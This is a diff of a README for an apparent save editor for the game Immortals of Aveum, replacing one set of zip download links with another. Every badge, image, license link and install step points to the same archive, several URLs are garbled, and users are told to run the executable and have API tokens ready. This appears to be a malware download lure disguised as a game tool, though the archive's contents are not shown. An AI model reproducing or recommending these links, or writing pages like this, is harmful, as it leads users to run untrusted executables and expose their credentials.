@@ -1,6 +1,6 @@
 # Immortals of Aveum Save Editor
 
-[![Download](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20of%20Aveum%20Save%https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
+[![Download](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip%20of%20Aveum%20Save%https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)
 
 ---
 
@@ -15,10 +15,10 @@ Are you ready to wield your influence? Tame the arcane system; rewrite your saga
 
 | Operating System  | Supported?             | Notes                                   |
 |-------------------|:----------------------:|-----------------------------------------|
-| ![Windows](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip) | ✅ | Fully supported (tested, 2025)         |
-| ![macOS](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20Soon-lightgrey?logo=apple)| 🛠️ | Planned for Q3 2025                    |
-| ![Linux](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)    | ⚠️ | Experimental; some limitations         |
-| ![Steam Deck](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip) | ⚠️ | Use desktop mode; see documentation    |
+| ![Windows](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip) | ✅ | Fully supported (tested, 2025)         |
+| ![macOS](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip%20Soon-lightgrey?logo=apple)| 🛠️ | Planned for Q3 2025                    |
+| ![Linux](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)    | ⚠️ | Experimental; some limitations         |
+| ![Steam Deck](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip) | ⚠️ | Use desktop mode; see documentation    |
 
 ---
 
@@ -104,7 +104,7 @@ Expand the horizons of your gameplay experience:
 
 To shape your destiny, take these steps:
 
-1. Click the **Download** badge at the top of this page or use https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip
+1. Click the **Download** badge at the top of this page or use https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip
 2. Unpack the installation archive to your preferred folder.
 3. Run the installer or launch the portable executable (see OS table).
 4. For AI features, have your relevant API tokens ready.
@@ -127,11 +127,11 @@ To shape your destiny, take these steps:
 
 Distributed under the MIT License (c) 2025.
 
-[![License: MIT](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
+[![License: MIT](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20of%20Aveum%20Save%https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
+[![Download](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip%20of%20Aveum%20Save%https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)](https://github.com/TomasOrd22/aveum-immortals-save-forge/raw/refs/heads/branch/highmoor/forge-save-aveum-immortals-v1.1-alpha.3.zip)
 
 ---
 
